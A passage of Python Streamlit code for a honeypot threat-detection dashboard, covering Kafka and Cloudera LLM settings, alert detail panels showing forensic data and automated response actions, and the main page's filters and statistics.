        st.session_state["cowrie_kafka_max_messages"] = int(kafka_max)
        st.session_state["settings_kafka_session_actor_topic"] = session_actor_topic.strip()
        st.session_state["settings_kafka_enriched_topic"] = enriched_topic.strip()
        st.session_state["settings_cloudera_base_url"] = cloudera_base.strip()
        st.session_state["settings_cloudera_model_id"] = cloudera_model.strip()
        st.session_state["settings_cloudera_jwt"] = cloudera_jwt.strip()

        apply_runtime_settings(
            kafka_bootstrap=st.session_state["cowrie_kafka_bootstrap"],
            session_actor_topic=st.session_state["settings_kafka_session_actor_topic"],
            enriched_topic=st.session_state["settings_kafka_enriched_topic"],
            cloudera_base_url=st.session_state["settings_cloudera_base_url"],
            cloudera_model_id=st.session_state["settings_cloudera_model_id"],
            cloudera_jwt=st.session_state["settings_cloudera_jwt"],
        )

        global _KAFKA_SESSION_ACTOR_TOPIC, _KAFKA_ENRICHED_TOPIC, _PHASE15_PIPELINE_TOPICS
        _KAFKA_SESSION_ACTOR_TOPIC = (
            st.session_state["settings_kafka_session_actor_topic"] or "cowrie.session_actor"
        )
        _KAFKA_ENRICHED_TOPIC = (
            st.session_state["settings_kafka_enriched_topic"] or "cowrie.normalized.enriched"
        )
        _PHASE15_PIPELINE_TOPICS = [
            "cowrie.normalized",
            _KAFKA_ENRICHED_TOPIC,
            _KAFKA_SESSION_ACTOR_TOPIC,
        ]

        if persist and env_writable:
            try:
                _upsert_dotenv(
                    env_writable,
                    {
                        "COWRIE_KAFKA_BOOTSTRAP": st.session_state["cowrie_kafka_bootstrap"],
                        "KAFKA_BOOTSTRAP_SERVERS": st.session_state["cowrie_kafka_bootstrap"],
                        "KAFKA_SESSION_ACTOR_TOPIC": _KAFKA_SESSION_ACTOR_TOPIC,
                        "KAFKA_NORMALIZED_ENRICHED_TOPIC": _KAFKA_ENRICHED_TOPIC,
                        "CLOUDERA_AI_BASE_URL": st.session_state["settings_cloudera_base_url"],
                        "CLOUDERA_MODEL_ID": st.session_state["settings_cloudera_model_id"],
                        "CLOUDERA_JWT_TOKEN": st.session_state["settings_cloudera_jwt"],
                    },
                )
                st.success("Saved")
            except OSError as exc:
                st.warning(f"Applied, but .env write failed: {exc}")
        else:
            st.success("Applied")

        try:
            load_dashboard_data_from_kafka.clear()
        except Exception:
            pass
        st.rerun()

    st.subheader("Kafka status")
    bootstrap = st.session_state.get("cowrie_kafka_bootstrap", "kafka:9092")
    try:
        from kafka import KafkaAdminClient  # type: ignore

        admin = KafkaAdminClient(
            bootstrap_servers=bootstrap,
            client_id="honeypot-settings-check",
            request_timeout_ms=3000,
        )
        topics = sorted(admin.list_topics())
        admin.close()
        st.success(f"Reachable · {len(topics)} topics")
    except Exception as exc:
        st.error(f"Unreachable: {exc}")

    st.subheader("Cloudera LLM status")
    st.caption("Uses values from the last **Apply** (session / process env).")
    jwt_status = _cloudera_jwt_status()
    if jwt_status.get("ok"):
        st.caption(jwt_status["message"])
    else:
        st.warning(jwt_status["message"])

    if st.button("🔌 Test Cloudera LLM connection", use_container_width=True, key="settings_test_cloudera"):
        with st.spinner("Calling Cloudera chat completions…"):
            # Prefer applied session values; fall back to process env inside the helper.
            st.session_state["settings_cloudera_test"] = _test_cloudera_llm_connection()

    test = st.session_state.get("settings_cloudera_test")
    if test:
        if test.get("ok"):
            st.success(
                f"Connected · `{test.get('model')}` · {test.get('elapsed_ms')} ms · "
                f"reply `{test.get('reply') or '—'}`"
            )
            st.caption(f"Base `{test.get('base_url')}` · token {test.get('token')}")
        else:
            st.error(f"Failed ({test.get('stage')}): {test.get('error')}")
            if test.get("detail") and test.get("detail") != test.get("error"):
                with st.expander("Details"):
                    st.code(str(test.get("detail")))



def _render_threat_alert_detail(alert: Dict[str, Any]) -> None:
    """Render detail panels for a single threat alert."""
    severity = alert.get("severity", "UNKNOWN")
    if is_react_agent_alert(alert):
        st.markdown(react_agent_badge_markdown(), unsafe_allow_html=True)
        ad = alert.get("attack_details") or {}
        confidence = ad.get("react_confidence")
        reasoning = ad.get("react_reasoning")
        if confidence is not None:
            st.caption(f"ReAct confidence: {confidence}")
        if reasoning:
            caption = _format_react_reasoning_caption(reasoning)
            if _react_reasoning_is_guardrail_only(reasoning):
                st.warning(caption)
            else:
                st.caption(caption)

    col1, col2 = st.columns(2)

    with col1:
        st.markdown(f"**{react_agent_star(alert)}Alert ID:** {alert.get('alert_id', 'N/A')}")
        st.markdown(f"**Timestamp:** {alert.get('timestamp', 'N/A')}")
        st.markdown(f"**Severity:** <span class='severity-{severity.lower()}'>{severity}</span>", unsafe_allow_html=True)
        st.markdown(f"**Threat Type:** {alert.get('threat_type', 'N/A')}")

        # Source IP with whois information
        source_ip = alert.get('source_ip', 'N/A')
        st.markdown(f"**Source IP:** `{source_ip}`")

        # Lookup and display whois information
        if source_ip != 'N/A':
            whois_data = lookup_whois_cached(source_ip)
            if whois_data:
                with st.expander("🌐 IP Whois Information", expanded=False):
                    if whois_data.get("type") == "private":
                        st.info(f"🔒 {whois_data.get('note', 'Private/local IP address')}")
                    elif whois_data.get("error"):
                        st.warning(f"⚠️ {whois_data.get('error', 'Whois lookup failed')}")
                    else:
                        # Display whois information in columns
                        whois_col1, whois_col2 = st.columns(2)

                        with whois_col1:
                            if whois_data.get("asn") != "N/A":
                                st.markdown(f"**ASN:** {whois_data.get('asn')}")
                                if whois_data.get("asn_description") != "N/A":
                                    st.caption(whois_data.get("asn_description", "")[:60])
                            if whois_data.get("country") != "N/A":
                                st.markdown(f"**Country:** {whois_data.get('country')}")

                        with whois_col2:
                            if whois_data.get("organization") and whois_data.get("organization") != "N/A":
                                st.markdown(f"**Organization:** {whois_data.get('organization')[:50]}")
                            elif whois_data.get("network") != "N/A":
                                st.markdown(f"**Network:** {whois_data.get('network')[:50]}")
                            if whois_data.get("cidr"):
                                st.caption(f"CIDR: {whois_data.get('cidr')}")

                        if whois_data.get("ip_range"):
                            st.caption(f"IP Range: {whois_data.get('ip_range')}")

    with col2:
        st.markdown("**Actor classification (Phase 1.5)**")
        _render_actor_classification_panel(alert)
        st.markdown(f"**Description:** {alert.get('description', 'N/A')}")
        st.markdown(f"**Recommended Action:** {alert.get('recommended_action', 'N/A')}")
        st.markdown(f"**Response Actions:** {len(alert.get('response_actions', []))}")

    # Alert Responses Section (show alerts first)
    response_actions = alert.get("response_actions", [])
    alert_responses = [a for a in response_actions if a.get("action_type") == "SEND_ALERT"]

    if alert_responses:
        st.subheader("📢 Alert Responses")
        st.info(f"**{len(alert_responses)} alert(s) sent to security team**")

        for i, alert_action in enumerate(alert_responses, 1):
            status = alert_action.get("status", "UNKNOWN")
            target = alert_action.get("target", "N/A")
            details = alert_action.get("details", {})

            # Determine status
            if status in ["sent", "success"]:
                status_emoji = "✅"
                status_color = "green"
                status_text = "Sent"
            elif status == "PENDING":
                status_emoji = "⏳"
                status_color = "orange"
                status_text = "Pending"
            else:
                status_emoji = "❌"
                status_color = "red"
                status_text = "Failed"

            # Determine alert type from target
            alert_type = "Unknown"
            alert_icon = "📢"
            if "slack" in target.lower() or "#" in target:
                alert_type = "Slack"
                alert_icon = "💬"
            elif "email" in target.lower() or "@" in target:
                alert_type = "Email"
                alert_icon = "📧"
            elif "webhook" in target.lower() or "http" in target.lower():
                alert_type = "Webhook"
                alert_icon = "🔗"

            with st.container():
                st.markdown(f"**{i}. {alert_icon} {alert_type} Alert**")

                col1, col2, col3 = st.columns(3)
                with col1:
                    st.markdown(f"**Channel/Recipient:** `{target}`")
                with col2:
                    st.markdown(f"**Status:** :{status_color}[{status_text}]")
                with col3:
                    st.markdown(f"**Time:** {alert_action.get('timestamp', 'N/A')}")

                # Show alert message/content
                if details:
                    message_id = details.get("message_id", "N/A")
                    channel = details.get("channel", target)
                    alert_message = details.get("message") or alert_action.get("reason", "")

                    with st.expander(f"📄 View Alert Content ({alert_type})", expanded=True):
                        # Show alert message prominently
                        if alert_message and alert_message != "Team notification" and alert_message != "Malicious activity alert":
                            st.markdown("**📢 Alert Message:**")
                            st.info(alert_message)
                            st.markdown("---")

                        col1, col2 = st.columns(2)
                        with col1:
                            st.markdown(f"**Message ID:** `{message_id}`")
                            st.markdown(f"**Channel/Recipient:** `{channel}`")
                        with col2:
                            st.markdown(f"**Alert Type:** {details.get('alert_type', alert_type)}")
                            st.markdown(f"**Severity:** {alert_action.get('severity', 'N/A')}")

                        # Show full details
                        st.markdown("**Full Alert Details:**")
                        st.json(details)
                else:
                    # Fallback: show reason as message
                    reason = alert_action.get("reason", "")
                    if reason and reason not in ["Team notification", "Malicious activity alert"]:
                        with st.expander(f"📄 View Alert Content ({alert_type})", expanded=True):
                            st.markdown("**📢 Alert Message:**")
                            st.info(reason)

                st.markdown("---")

    # Response actions details (all actions)
    st.subheader("📋 All Response Actions")
    response_actions = alert.get("response_actions", [])

    if response_actions:
        # Show summary first
        st.info(f"**{len(response_actions)} automated response action(s) executed**")

        # Group actions by type for better display
        action_groups = {}
        for action in response_actions:
            action_type = action.get("action_type", "UNKNOWN")
            if action_type not in action_groups:
                action_groups[action_type] = []
            action_groups[action_type].append(action)

        for action_type, actions in action_groups.items():
            # Skip SEND_ALERT as we already showed it above
            if action_type == "SEND_ALERT":
                continue

            st.markdown(f"**{action_type}** ({len(actions)} action(s))")

            for i, action in enumerate(actions, 1):
                status = action.get("status", "UNKNOWN")

                # Determine status emoji and color
                if status in ["success", "blocked", "sent", "created", "updated", "quarantined"]:
                    status_emoji = "✅"
                    status_color = "green"
                elif status == "PENDING":
                    status_emoji = "⏳"
                    status_color = "orange"
                else:
                    status_emoji = "❌"
                    status_color = "red"

                # Action type descriptions
                action_descriptions = {
                    "BLOCK_IP_COWRIE": "🔒 Blocked IP in Cowrie honeypot (prevents connections at source)",
                    "BLOCK_IP": "🛡️ Blocked IP at firewall level (network-wide protection)",
                    "LOG_INCIDENT": "🎫 Created incident ticket for tracking",
                    "UPDATE_THREAT_INTEL": "📊 Updated threat intelligence database",
                    "QUARANTINE": "🚫 Quarantined active session/system"
                }

                action_desc = action_descriptions.get(action_type, f"Executed {action_type}")

                with st.container():
                    st.markdown(f"  {status_emoji} **{i}. {action_type}**")
                    st.caption(f"   {action_desc}")

                    col1, col2 = st.columns(2)
                    with col1:
                        st.markdown(f"   **Target:** `{action.get('target', 'N/A')}`")
                        st.markdown(f"   **Status:** :{status_color}[{status}]")
                    with col2:
                        st.markdown(f"   **Severity:** {action.get('severity', 'N/A')}")
                        st.markdown(f"   **Time:** {action.get('timestamp', 'N/A')}")

                    st.markdown(f"   **Reason:** {action.get('reason', 'N/A')}")

                    if action.get("details"):
                        with st.expander(f"   🔍 View {action_type} Details"):
                            st.json(action.get("details"))

                    st.markdown("---")
    else:
        st.warning("⚠️ No response actions taken for this alert. This may indicate:")
        st.markdown("- Threat was logged but didn't meet response thresholds")
        st.markdown("- Response system is in monitoring-only mode")
        st.markdown("- Manual review required before action")

    # Attack details
    attack_details = alert.get("attack_details", {})
    if attack_details:
        st.subheader("🔍 Attack Details")
        st.json(attack_details)

    # Forensic Data Section
    forensic_data = alert.get("forensic_data", {})
    if forensic_data:
        st.subheader("🔬 Forensic Data")

        # Session Information
        session_info = forensic_data.get("session_info", {})
        if session_info:
            with st.expander("📊 Session Information", expanded=False):
                col1, col2 = st.columns(2)
                with col1:
                    st.markdown(f"**Session ID:** `{session_info.get('session_id', 'N/A')}`")
                    st.markdown(f"**Start Time:** {session_info.get('start_time', 'N/A')}")
                    st.markdown(f"**Protocol:** {session_info.get('protocol', 'N/A')}")
                with col2:
                    duration = session_info.get('duration_seconds', 0)
                    st.markdown(f"**Duration:** {duration} seconds ({duration//60}m {duration%60}s)")
                    st.markdown(f"**End Time:** {session_info.get('end_time', 'N/A')}")
                    authenticated = session_info.get('authenticated', False)
                    auth_status = "✅ Authenticated" if authenticated else "❌ Not Authenticated"
                    st.markdown(f"**Status:** {auth_status}")

        # Network Information
        network_info = forensic_data.get("network_info", {})
        if network_info:
            with st.expander("🌐 Network Information", expanded=False):
                col1, col2 = st.columns(2)
                with col1:
                    st.markdown(f"**Source IP:** `{network_info.get('source_ip', 'N/A')}`")
                    hostname = network_info.get('source_hostname')
                    if hostname:
                        st.markdown(f"**Hostname:** `{hostname}`")
                    st.markdown(f"**Source Port:** {network_info.get('source_port', 'N/A')}")
                    st.markdown(f"**Destination:** {network_info.get('destination_ip', 'N/A')}:{network_info.get('destination_port', 'N/A')}")
                with col2:
                    st.markdown(f"**Bytes Sent:** {network_info.get('bytes_sent', 0):,}")
                    st.markdown(f"**Bytes Received:** {network_info.get('bytes_received', 0):,}")

                connections = network_info.get("connections", [])
                if connections:
                    st.markdown("**Network Connections:**")
                    for conn in connections:
                        st.markdown(f"- {conn.get('protocol', 'N/A').upper()} connection on port {conn.get('local_port', 'N/A')} "
                                  f"from {conn.get('remote_port', 'N/A')} at {conn.get('established_at', 'N/A')}")

        # Command History
        command_history = forensic_data.get("command_history", [])
        if command_history:
            with st.expander(f"⌨️ Command History ({len(command_history)} commands)", expanded=False):
                for i, cmd in enumerate(command_history, 1):
                    st.markdown(f"**{i}. {cmd.get('timestamp', 'N/A')}**")
                    st.code(cmd.get('command', 'N/A'), language='bash')
                    if cmd.get('command_hash'):
                        st.caption(f"Hash: `{cmd.get('command_hash')}`")
                    if cmd.get('exit_code') is not None:
                        exit_code = cmd.get('exit_code')
                        status = "✅" if exit_code == 0 else "❌"
                        st.caption(f"{status} Exit code: {exit_code}")
                    st.markdown("---")

        # Filesystem Changes
        filesystem_changes = forensic_data.get("filesystem_changes", [])
        if filesystem_changes:
            with st.expander(f"📁 Filesystem Changes ({len(filesystem_changes)} files)", expanded=False):
                for change in filesystem_changes:
                    col1, col2 = st.columns(2)
                    with col1:
                        st.markdown(f"**Action:** {change.get('action', 'N/A').upper()}")
                        st.markdown(f"**Filename:** `{change.get('filename', 'N/A')}`")
                        st.markdown(f"**Path:** `{change.get('path', 'N/A')}`")
                    with col2:
                        size = change.get('size_bytes', 0)
                        st.markdown(f"**Size:** {size:,} bytes ({size/1024:.2f} KB)")
                        if change.get('hash'):
                            st.markdown(f"**Hash:** `{change.get('hash')}`")
                        st.markdown(f"**Time:** {change.get('timestamp', 'N/A')}")
                    st.markdown("---")

        # Process Information
        processes = forensic_data.get("processes", [])
        if processes:
            with st.expander(f"⚙️ Process Information ({len(processes)} processes)", expanded=False):
                for proc in processes:
                    col1, col2 = st.columns(2)
                    with col1:
                        st.markdown(f"**PID:** {proc.get('pid', 'N/A')}")
                        st.markdown(f"**Name:** `{proc.get('name', 'N/A')}`")
                        st.markdown(f"**User:** `{proc.get('user', 'N/A')}`")
                    with col2:
                        st.markdown(f"**Parent PID:** {proc.get('parent_pid', 'N/A')}")
                        st.markdown(f"**Started:** {proc.get('started_at', 'N/A')}")
                    if proc.get('command_line'):
                        st.code(proc.get('command_line', 'N/A'), language='bash')
                    st.markdown("---")

        # Client Information
        client_info = forensic_data.get("client_info", {})
        if client_info:
            with st.expander("💻 Client Information", expanded=False):
                col1, col2 = st.columns(2)
                with col1:
                    st.markdown(f"**SSH Client:** {client_info.get('ssh_client', 'N/A')}")
                    st.markdown(f"**SSH Version:** {client_info.get('ssh_version', 'N/A')}")
                with col2:
                    st.markdown(f"**Cipher:** {client_info.get('cipher', 'N/A')}")
                    st.markdown(f"**MAC:** {client_info.get('mac', 'N/A')}")

        # Attack Timeline
        timeline = forensic_data.get("timeline", [])
        if timeline:
            with st.expander(f"⏱️ Attack Timeline ({len(timeline)} events)", expanded=False):
                for event in timeline:
                    st.markdown(f"**{event.get('timestamp', 'N/A')}** - {event.get('event', 'N/A')}")
                    st.caption(event.get('description', 'N/A'))
                    st.markdown("---")

        # Indicators of Compromise
        iocs = forensic_data.get("indicators_of_compromise", [])
        if iocs:
            with st.expander(f"🚨 Indicators of Compromise ({len(iocs)} IOCs)", expanded=True):
                for ioc in iocs:
                    st.markdown(f"- ⚠️ {ioc}")

        # Threat Intelligence
        threat_intel = forensic_data.get("threat_intelligence", {})
        if threat_intel:
            with st.expander("🔍 Threat Intelligence", expanded=False):
                col1, col2 = st.columns(2)
                with col1:
                    st.markdown(f"**IP Reputation:** {threat_intel.get('ip_reputation', 'Unknown')}")
                    geo = threat_intel.get('geolocation', {})
                    if geo:
                        st.markdown(f"**Country:** {geo.get('country', 'Unknown')}")
                        st.markdown(f"**City:** {geo.get('city', 'Unknown')}")
                with col2:
                    st.markdown(f"**Tor Exit Node:** {'Yes' if threat_intel.get('is_tor_exit') else 'No'}")
                    st.markdown(f"**Proxy/VPN:** {'Yes' if threat_intel.get('is_proxy') else 'No'}")
                    if geo.get('latitude') and geo.get('longitude'):
                        st.markdown(f"**Location:** {geo.get('latitude')}, {geo.get('longitude')}")

        # Full Forensic Data (JSON)
        with st.expander("📋 View Full Forensic Data (JSON)", expanded=False):
            st.json(forensic_data)

def main():
    """Main dashboard function."""
    _init_settings_defaults()

    # Compact brand + nav
    st.sidebar.markdown(
        """
        <div class="sidebar-brand">
          <div class="eyebrow">Ratatoskr</div>
          <div class="title">HoneyPot</div>
        </div>
        """,
        unsafe_allow_html=True,
    )
    _PAGES = [
        "Threat Detection",
        "AI Agent Detection",
        "ReAct Agent Lab",
        "Counter-Attacks",
        "Geographic Analysis",
        "Timeline & Patterns",
        "Threat Intelligence",
        "Settings",
    ]
    # Explicit key so selection survives reruns and does not reset to index 0.
    if st.session_state.get("honeypot_page") not in _PAGES:
        st.session_state["honeypot_page"] = "Threat Detection"
    page = st.sidebar.radio(
        "Page",
        _PAGES,
        key="honeypot_page",
        label_visibility="collapsed",
    )
    st.sidebar.caption(f"View · {page}")

    # On tab change, jump the main pane to the top so prior scroll position
    # (and any scrolled-off content) does not carry over.
    if st.session_state.get("_honeypot_page_scrolled") != page:
        st.session_state["_honeypot_page_scrolled"] = page
        _scroll_main_to_top()

    if page == "Settings":
        # Early return: nothing from other pages (incl. ReAct Lab / Phase 3) is rendered.
        render_settings_page()
        return

    # -----------------------------
    # Data source switcher
    # -----------------------------
    st.sidebar.markdown("---")
    source = st.sidebar.radio(
        "Data source",
        options=["JSON file", "Kafka topic", "Both"],
        key="cowrie_data_source_mode",
        horizontal=True,
    )
    st.sidebar.caption("Kafka / Cloudera → **Settings**")

    def _dedupe_by_alert_id(rows: list) -> list:
        if not rows:
            return []
        seen = set()
        out = []
        # Keep the newest occurrence (iterate from end).
        for r in reversed(rows):
            if not isinstance(r, dict):
                continue
            aid = r.get("alert_id")
            if not aid or aid in seen:
                continue
            seen.add(aid)
            out.append(r)
        return list(reversed(out))

    alerts_data: list = []
    use_kafka = source in ("Kafka topic", "Both")
    use_file = source in ("JSON file", "Both")

    kafka_rows: list = []
    file_rows: list = []

    if use_kafka:
        # Kafka bootstrap/topic/max come from Settings (session state / .env)
        bootstrap = st.session_state.get(
            "cowrie_kafka_bootstrap",
            os.environ.get(
                "COWRIE_KAFKA_BOOTSTRAP",
                os.environ.get("KAFKA_BOOTSTRAP_SERVERS", "kafka:9092"),
            ),
        )
        topic = st.session_state.get("cowrie_kafka_topic", _PREDEFINED_KAFKA_TOPICS[0])
        max_messages = int(st.session_state.get("cowrie_kafka_max_messages", 250))
        if st.sidebar.button("Reload Kafka", use_container_width=True, key="cowrie_reload_kafka"):
            load_dashboard_data_from_kafka.clear()
            st.rerun()
        if topic == "Both (workflow + ReAct)":
            kafka_rows = _dedupe_by_alert_id(
                load_dashboard_data_from_kafka(
                    bootstrap_servers=bootstrap,
                    topic="cowrie.alerts",
                    max_messages=max_messages,
                )
                + load_dashboard_data_from_kafka(
                    bootstrap_servers=bootstrap,
                    topic="cowrie.react_alerts",
                    max_messages=max_messages,
                )
            )
        else:
            kafka_rows = load_dashboard_data_from_kafka(
                bootstrap_servers=bootstrap,
                topic=topic,
                max_messages=max_messages,
            )

    if use_file:
        if st.sidebar.button("Reload JSON", use_container_width=True, key="cowrie_reload_json"):
            load_dashboard_data.clear()
            st.rerun()
        file_rows = load_dashboard_data()

    if source == "Both":
        alerts_data = _dedupe_by_alert_id((file_rows or []) + (kafka_rows or []))
    elif source == "Kafka topic":
        alerts_data = kafka_rows
    else:
        alerts_data = file_rows

    # Compact health strip (collapsed by default)
    with st.sidebar.expander(f"Status · {len(alerts_data)} alerts", expanded=False):
        st.caption(f"Mode: {source}")
        if use_kafka:
            k = st.session_state.get("cowrie_dashboard_kafka", {})
            if k.get("enabled") is False and k.get("error"):
                st.error(k["error"])
            else:
                st.caption(f"Kafka: {k.get('topic', 'n/a')}")
        if use_file:
            src = st.session_state.get("cowrie_dashboard_file", "not found")
            st.caption(f"File: {Path(str(src)).name if src else 'n/a'}")
        if alerts_data:
            last = alerts_data[-1]
            st.caption(f"Last: {alert_actor_class(last)} · {str(last.get('timestamp', ''))[:19]}")
            if is_react_agent_alert(last):
                st.markdown(react_agent_badge_markdown(), unsafe_allow_html=True)
    session_scores: list = []
    sa_meta: dict = {}
    bootstrap_sa = os.environ.get(
        "COWRIE_KAFKA_BOOTSTRAP", os.environ.get("KAFKA_BOOTSTRAP_SERVERS", "kafka:9092")
    )
    if use_kafka:
        bootstrap_sa = st.session_state.get("cowrie_kafka_bootstrap") or bootstrap_sa
        session_scores = load_session_actor_from_kafka(
            bootstrap_servers=bootstrap_sa,
            topic=_KAFKA_SESSION_ACTOR_TOPIC,
            max_messages=150,
        )
        sa_meta = st.session_state.get("cowrie_session_actor_kafka", {})
        if page == "Threat Detection":
            with st.sidebar.expander("Session scores", expanded=False):
                st.caption(f"{_KAFKA_SESSION_ACTOR_TOPIC} · {len(_dedupe_session_scores(session_scores))} loaded")
                if sa_meta.get("error"):
                    st.error(sa_meta["error"])
    
    if page == "AI Agent Detection":
        pipeline_health = None
        if use_kafka:
            pipeline_health = load_phase15_pipeline_health(bootstrap_sa)
        render_ai_agent_detection_dashboard(
            alerts_data,
            session_scores,
            pipeline_health=pipeline_health,
            kafka_enabled=use_kafka,
            sa_meta=sa_meta,
        )
        return
    if page == "ReAct Agent Lab":
        render_react_agent_lab()
        return
    if page == "Counter-Attacks":
        render_counter_attack_dashboard(alerts_data)
        return
    elif page == "Geographic Analysis":
        render_geographic_dashboard(alerts_data)
        return
    elif page == "Timeline & Patterns":
        render_timeline_patterns_dashboard(alerts_data)
        return
    elif page == "Threat Intelligence":
        render_threat_intelligence_dashboard(alerts_data)
        return
    
    # Original threat detection dashboard
    # Header
    st.markdown(
        '<div class="main-header">HoneyPot Threat Detection</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Ratatoskr · live Cowrie alerts, actor class, and Flink Agent response</p>',
        unsafe_allow_html=True,
    )
    
    if not alerts_data:
        st.warning("No threat detection data available. Run the demo first to generate data.")
        st.info("Run: `python demo_cowrie_response.py` to generate threat detection results.")
        col1, col2 = st.columns([1, 3])
        with col1:
            if st.button("▶️ Generate demo data", key="generate_demo_data"):
                with st.spinner("Running demo to generate dashboard data..."):
                    result = _try_run_demo_cowrie_response()
                if result.get("returncode") == 0:
                    st.success("Demo finished. Reloading dashboard data.")
                    load_dashboard_data.clear()
                    st.rerun()
                else:
                    st.error("Demo did not complete successfully.")
                    st.caption(f"Attempt: `{result.get('attempt')}`")
                    st.code(result.get("cmd", ""), language="bash")
                    if result.get("stdout"):
                        st.text_area("stdout", result["stdout"], height=180)
                    if result.get("stderr"):
                        st.text_area("stderr", result["stderr"], height=180)
        with col2:
            st.caption(
                "Tip: If you're running via Docker Compose, make sure services are up. "
                "This button will try local execution first, then `docker exec` into the TaskManager."
            )
        return
    
    # Attack Simulation Section
    with st.sidebar.expander("Simulate", expanded=False):
        if st.button("Critical", use_container_width=True, key="sim_crit"):
            _simulate_and_report("SUCCESSFUL_INTRUSION")
            st.rerun()
        if st.button("High", use_container_width=True, key="sim_high"):
            _simulate_and_report("MALICIOUS_COMMAND")
            st.rerun()
        if st.button("Medium", use_container_width=True, key="sim_med"):
            _simulate_and_report("BRUTE_FORCE_ATTEMPT")
            st.rerun()
        if st.button("File DL", use_container_width=True, key="sim_file"):
            _simulate_and_report("SUSPICIOUS_FILE_DOWNLOAD")
            st.rerun()
        if st.button("Random", use_container_width=True, key="sim_rand"):
            attack_type = random.choice(
                [
                    "SUCCESSFUL_INTRUSION",
                    "MALICIOUS_COMMAND",
                    "BRUTE_FORCE_ATTEMPT",
                    "SUSPICIOUS_FILE_DOWNLOAD",
                ]
            )
            _simulate_and_report(attack_type)
            st.rerun()
        last_sim = st.session_state.get("last_simulate_result")
        if last_sim:
            tag = "ReAct" if last_sim.get("is_react") else "workflow"
            st.caption(f"Last: {tag}")

    # Sidebar filters
    st.sidebar.markdown("---")
    st.sidebar.caption("Filters")
    
    # Severity filter
    all_severities = sorted(set(alert.get("severity", "UNKNOWN") for alert in alerts_data))
    selected_severities = st.sidebar.multiselect(
        "Severity",
        options=all_severities,
        default=all_severities
    )
    
    # Threat type filter
    all_threat_types = sorted(set(alert.get("threat_type", "UNKNOWN") for alert in alerts_data))
    selected_threat_types = st.sidebar.multiselect(
        "Threat Type",
        options=all_threat_types,
        default=all_threat_types
    )

    all_actor_classes = sorted(set(alert_actor_class(a) for a in alerts_data))
    selected_actor_classes = st.sidebar.multiselect(
        "Actor Class",
        options=all_actor_classes,
        default=all_actor_classes,
        help="Palisade-style classification: bot, human, potential_llm, confirmed_llm",
    )

    potential_llm_count = sum(
        1 for a in alerts_data if alert_actor_class(a) in ("potential_llm", "confirmed_llm")
    )
    confirmed_llm_count = sum(1 for a in alerts_data if alert_actor_class(a) == "confirmed_llm")
    st.sidebar.caption(f"LLM: {potential_llm_count} pot. · {confirmed_llm_count} conf.")
    
    # Filter alerts
    # Normalize missing fields so filtering doesn't silently drop alerts.
    filtered_alerts = [
        alert for alert in alerts_data
        if alert.get("severity", "UNKNOWN") in selected_severities
        and alert.get("threat_type", "UNKNOWN") in selected_threat_types
        and alert_actor_class(alert) in selected_actor_classes
    ]
    
    # Auto-refresh settings
    st.sidebar.markdown("---")
    auto_refresh = st.sidebar.checkbox("Auto-refresh", value=False)
    refresh_blocked_ips_only = st.sidebar.checkbox("Refresh blocked IPs only", value=True)

    if auto_refresh:
        import time

        time.sleep(5)
        if refresh_blocked_ips_only:
            load_blocked_ips.clear()
            st.session_state["refresh_blocked_ips"] = True
        else:
            st.cache_data.clear()
        st.rerun()

    c_reload, c_ips = st.sidebar.columns(2)
    with c_reload:
        if st.button("Reload", use_container_width=True, key="manual_reload"):
            st.cache_data.clear()
            st.rerun()
    with c_ips:
        if st.button("IPs only", use_container_width=True, key="manual_ips"):
            load_blocked_ips.clear()
            st.rerun()

    # How Flink Agents Respond - Main Section
    with st.expander("🤖 How Flink Agents Automatically Respond to Threats", expanded=False):
        col1, col2 = st.columns(2)
        
        with col1:
            st.markdown("### ⚡ Real-Time Response Capabilities")
            st.markdown("""
            Flink Agents process security events in real-time and automatically execute 
            response actions based on threat severity and type.
            
            **Response Types:**
            - 🔒 **IP Blocking** - Immediate containment at honeypot and firewall
            - 📢 **Alerting** - Team notifications via Slack, Email, PagerDuty
            - 🎫 **Incident Management** - Automatic ticket creation in Jira/ServiceNow
            - 📊 **Threat Intelligence** - Update threat feeds and databases
            - 🚫 **Session Quarantine** - Terminate and isolate active attacks
            - 🔗 **Webhooks** - Trigger custom integrations and workflows
            """)
        
        with col2:
            st.markdown("### 🎯 Response Strategy")
            st.markdown("""
            **Immediate Response (High Confidence Threats):**
            - Successful intrusions → Block IP + Quarantine + Alert
            - Malicious commands → Block IP + Create ticket
            - File downloads → Block IP + Analyze file
            
            **Monitoring (Medium Confidence):**
            - Suspicious activity → Alert + Monitor
            - Brute force attempts → Track + Alert after threshold
            
            **Logging (Low Confidence):**
            - Unusual patterns → Log for analysis
            - No automated response (avoid false positives)
            """)
        
        st.markdown("---")
        st.markdown("### 📋 Response Action Details")
        
        # Show response action examples from actual data
        if filtered_alerts:
            action_examples = {}
            for alert in filtered_alerts[:5]:  # Show examples from first 5 alerts
                for action in alert.get("response_actions", []):
                    action_type = action.get("action_type", "UNKNOWN")
                    if action_type not in action_examples:
                        action_examples[action_type] = {
                            "description": action.get("reason", ""),
                            "status": action.get("status", ""),
                            "target": action.get("target", "")
                        }
            
            if action_examples:
                cols = st.columns(min(3, len(action_examples)))
                for idx, (action_type, example) in enumerate(action_examples.items()):
                    with cols[idx % len(cols)]:
                        status_emoji = "✅" if example["status"] == "success" or example["status"] == "blocked" else "⏳"
                        st.markdown(f"**{status_emoji} {action_type}**")
                        st.caption(f"Target: {example['target']}")
                        st.caption(f"Status: {example['status']}")
        
        st.markdown("---")
        st.markdown("""
        **🔗 Integration Options:**
        - **Firewall**: AWS Security Groups, pfSense, iptables
        - **Alerting**: Slack, Email, PagerDuty, Microsoft Teams
        - **Ticketing**: Jira, ServiceNow, GitHub Issues
        - **Threat Intel**: MISP, OpenCTI, Custom databases
        - **SIEM**: Splunk, ELK, QRadar
        
        See [COWRIE_RESPONSE_GUIDE.md](COWRIE_RESPONSE_GUIDE.md) for production integration code.
        """)
    
    # Statistics
    st.header("📊 Overview Statistics")
    
    col1, col2, col3, col4, col5 = st.columns(5)
    
    total_alerts = len(filtered_alerts)
    critical_count = sum(1 for a in filtered_alerts if a.get("severity") == "CRITICAL")
    high_count = sum(1 for a in filtered_alerts if a.get("severity") == "HIGH")
    react_count = sum(1 for a in filtered_alerts if is_react_agent_alert(a))
    total_actions = sum(len(a.get("response_actions", [])) for a in filtered_alerts)
    
    with col1:
        st.metric("Total Alerts", total_alerts)
    with col2:
        st.metric("Critical Alerts", critical_count, delta=None)
    with col3:
        st.metric("High Severity", high_count, delta=None)
    with col4:
        st.metric("⭐ ReAct Alerts", react_count, delta=None)
    with col5:
        st.metric("Response Actions", total_actions)

    ac1, ac2, ac3, ac4, ac5 = st.columns(5)
